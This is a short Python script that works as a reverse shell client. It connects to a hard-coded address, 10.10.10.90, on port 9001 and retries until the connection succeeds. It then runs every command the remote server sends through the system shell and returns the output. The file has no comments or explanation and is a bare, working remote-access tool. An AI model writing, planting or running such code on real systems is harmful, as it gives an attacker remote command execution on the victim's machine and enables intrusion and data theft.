import sys
import socket
import subprocess
import os

HOST = "10.10.10.90"
PORT = 9001
msg = ""

s = socket.socket()
for i in range(0,100):
    if i == 99:
        i = 0
    try:
        s.connect((HOST, PORT))
    except Exception:
        continue
    break
msg = s.recv(1024).decode("UTF-8")
print(f"[*] server: {msg}")
while True:
    cmd = s.recv(1024).decode("UTF-8")
    print(f"[!] received command: {cmd}")
    if cmd.lower() in ["quit", "exit", "bye", 'q']:
        break

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode("UTF-8")
    
    if len(result) == 0:
        result = "[+] executed succesfully".encode("UTF-8")
    
    s.send(result)
s.close()